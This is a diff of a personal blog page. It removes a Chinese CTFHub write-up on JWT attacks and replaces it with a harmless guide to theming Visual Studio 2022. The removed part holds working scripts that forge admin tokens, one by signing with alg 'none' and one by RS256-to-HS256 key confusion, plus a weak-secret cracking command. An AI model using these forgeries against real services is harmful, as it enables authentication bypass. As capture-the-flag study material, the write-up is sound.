@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">ctfhub-jwt | s1rius&#39;s blog</title>
+  <title itemprop="name">Visual Studio 2022界面美化教程 | s1rius&#39;s blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -287,7 +287,7 @@
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      ctfhub-jwt</h1>
+      Visual Studio 2022界面美化教程</h1>
       <p class="entry-census">
         <span>
           <a href="cns1rius.github.io">
@@ -313,50 +313,24 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob" target="_blank" rel="noopener">jwt基础知识</a></p>
-<p>flag在下面</p>
-<p>需要了解一下jwt组成部分</p>
-<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p>
-<p>进去查消息头</p>
-<p>然后在</p>
-<p><a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a></p>
-<p>decode    一共两部分ag是另一半<br><img src="https://img-blog.csdnimg.cn/a4b0f89e87f84f8aa21b3071ec99c066.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">algorithm=<span class="string">"none"</span></span><br><span class="line">payload = &#123;</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"role"</span>:<span class="string">"admin"</span></span><br><span class="line">  &#125;</span><br><span class="line">key = <span class="string">""</span></span><br><span class="line">encoded = jwt.encode(payload,key,algorithm)</span><br><span class="line">print(encoded)</span><br></pre></td></tr></table></figure>
-<p>jwt的签名可以为无</p>
-<blockquote>
-<p>今天写这个脚本的时候命名为jwt.py</p>
-<p>结果报错 但是系统环境运行正常</p>
-<p>才知道是文件名的事</p>
-<p>import jwt 他先自己引用自己了</p>
-</blockquote>
-<p>抓包</p>
-<p>把cookie里的token改为这脚本的运行结果</p>
-<h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></p>
-<p>依次执行即可</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/brendan-rius/c-jwt-cracker</span><br><span class="line">./c-jwt-cracker</span><br><span class="line">make</span><br><span class="line">./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</span><br></pre></td></tr></table></figure>
-<p>然后得出该jwt密钥</p>
-<p>然后放之前那个网站</p>
-<p>改role为admin</p>
-<p><img src="https://img-blog.csdnimg.cn/7fbb4534fca24281881a5aea1cba74ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/0c56be41283b43b7ae7bb6c95aac0ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">返回提交token<br><img src="https://img-blog.csdnimg.cn/5da55fadcc664157bfd8481e7bd0d57d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
-<h1 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h1><p>把cookie清空后提交用户名密码</p>
-<p>得到一串jwt</p>
-<p>丢进<br><img src="https://img-blog.csdnimg.cn/f12a54b8f88848f49959045582a95cb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>发现是RS256编码（不对称式编码）</p>
-<p>需要改为对称式编码</p>
-<p>如HS256</p>
-<p>题目中给了public key</p>
-<p>用PUBLIC_KEY采用HS256进行加密payload构造token</p>
-<p>借用<a href="https://blog.csdn.net/loseheart157" target="_blank" rel="noopener">大神h0ld1rs</a>的脚本</p>
-<blockquote>
-<p>无签名那段脚本</p>
-<p>是勉勉强强写出来的</p>
-<p>这题就先用大神的脚本吧</p>
-<p>我太菜了</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'publickey.pem'</span>)<span class="comment">#需要将文中的publickey下载	与脚本同目录</span></span><br><span class="line">key = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Paste your header and payload here</span></span><br><span class="line">header = <span class="string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span></span><br><span class="line">payload = <span class="string">'&#123;"username": "admin", "role": "admin"&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded header</span></span><br><span class="line">encodeHBytes = base64.urlsafe_b64encode(header.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodeHeader = str(encodeHBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating encoded payload</span></span><br><span class="line">encodePBytes = base64.urlsafe_b64encode(payload.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">encodePayload = str(encodePBytes, <span class="string">"utf-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Concatenating header and payload</span></span><br><span class="line">token = (encodeHeader + <span class="string">"."</span> + encodePayload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating signature</span></span><br><span class="line">sig = base64.urlsafe_b64encode(hmac.new(bytes(key, <span class="string">"UTF-8"</span>), token.encode(<span class="string">"utf-8"</span>), hashlib.sha256).digest()).decode(<span class="string">"UTF-8"</span>).rstrip(<span class="string">"="</span>)</span><br><span class="line"></span><br><span class="line">print(token + <span class="string">"."</span> + sig)</span><br></pre></td></tr></table></figure>
-<p>运行后把token返回去验证</p>
-<p>成功</p>
-<p><img src="https://img-blog.csdnimg.cn/169a632c18eb4233a605602f6f6b9cde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/cbb9f91b8d69482283ce362d1407284f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+          <p><a href="https://img-blog.csdnimg.cn/03104c8b341040169bb60d74b3b1fbde.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p>
+<p> 我之前用的是2019版本，后来有出新版我也没管，直到前几天他给我推送2022版了，查了下大部分都是好评（bug恐惧症和恋旧），于是我决定入2022版了，但又怕我在2019调好的设置用不到2022上，于是暂时让两个版本共存，等2022调试好了再说2019的事。</p>
+<p>这是我在2019上美化用到的插件和设置（因为网上类似的不少，但2022版貌似没有人发过，所以我决定写这篇文章）</p>
+<p>不出所料，2022版好多东西更新，导致一些东西不能用了，导入2019版甚至文件的时候，有一部分报错了，要不然就是改名了，要不然就是更新换代了，没大有影响，以萌新目前来看，是往好的方向发展了。</p>
+<p>但是我的那些美化插件直接搜名字的话是找不到了，于是我就在那找替代品，就找到了这两个插件。</p>
+<p>第一个插件，是2019版变的，变了样之后差点给我整不会了，它是类似于编程。</p>
+<p>新建项目 C#里面最后一项</p>
+<p><a href="https://img-blog.csdnimg.cn/22fac527d6ff4b8daf11563025ce5a77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p>
+<p><a href="da3a0ac9713d4b289c4351ca0ac8835d.png">点击并拖拽以移动</a></p>
+<p> 创建之后，把2019版的该插件里的美化设置导出，然后重命名为CustomTheme.vstheme</p>
+<p>然后复制到你新创建的2022版那个项目里，选择替换更新，之后项目文件夹里.sln后缀的那个文件打开，选择你之前那个配置的名字，然后运行，不管他蹦出来啥弹窗，等他一打开接着关了就好，之后重启visualstudio就可以了</p>
+<p><a href="https://img-blog.csdnimg.cn/e7c8d9ad7a424cd9aeb625bbc42e9657.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p>
+<p>这个插件是为后面设置背景图片准备</p>
+<p>第二个插件我原来用的是moeIDE，但是2022版它不支持了，所以就用新插件代替了。</p>
+<p><a href="https://img-blog.csdnimg.cn/796d2426b994430f9a0a11ef42929ad0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p>
+<p>背景图是B站1024节发布的一张壁纸，我用ps调了下对比度，让他更鲜艳一些</p>
+<p><a href="https://img-blog.csdnimg.cn/e86170054a0442cba2a16772dba96e81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" target="_blank" rel="noopener">点击并拖拽以移动</a></p>
+<p>​</p>
 
         </div>
         <!-- .entry-content -->
@@ -385,36 +359,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2022/08/linux动态加载/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                linux动态加载</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2022/08/git/" rel="next">
+            <a href="/2022/08/XXE/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.yimian.xyz/img?type=moe" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.yimian.xyz/img?type=moe">
+                <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                git命令</h3>
+                xxe</h3>
                 <hr>
               </div>
             </a>
